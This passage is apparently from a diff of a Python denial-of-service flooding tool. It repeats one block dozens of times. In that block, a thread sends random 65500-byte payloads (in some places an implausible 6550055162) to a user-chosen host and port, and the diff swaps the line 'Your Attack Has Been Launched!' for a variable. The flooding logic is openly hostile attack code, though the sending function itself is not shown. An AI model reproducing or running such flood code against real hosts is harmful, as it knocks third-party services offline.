 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1688,7 +1732,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1704,7 +1748,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1720,7 +1764,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1736,7 +1780,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1752,7 +1796,7 @@ def main():
 					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1768,7 +1812,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1784,7 +1828,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1800,7 +1844,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1816,7 +1860,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1832,7 +1876,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1848,7 +1892,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1864,7 +1908,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1880,7 +1924,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1896,7 +1940,7 @@ def main():
 					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1913,7 +1957,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1929,7 +1973,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1945,7 +1989,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1961,7 +2005,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1977,7 +2021,7 @@ def main():
 					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1993,7 +2037,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -2009,7 +2053,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -2025,7 +2069,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -2041,7 +2085,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -2057,7 +2101,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -2073,7 +2117,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -2089,7 +2133,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -2105,7 +2149,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -2121,7 +2165,7 @@ def main():
 					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -2137,7 +2181,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -2153,7 +2197,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -2169,7 +2213,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -2185,7 +2229,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -2201,7 +2245,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -2217,7 +2261,7 @@ def main():
 					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -2233,7 +2277,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -2249,7 +2293,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -2265,7 +2309,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -2281,7 +2325,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -2297,7 +2341,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -2313,7 +2357,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -2329,7 +2373,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -2345,7 +2389,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -2361,7 +2405,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
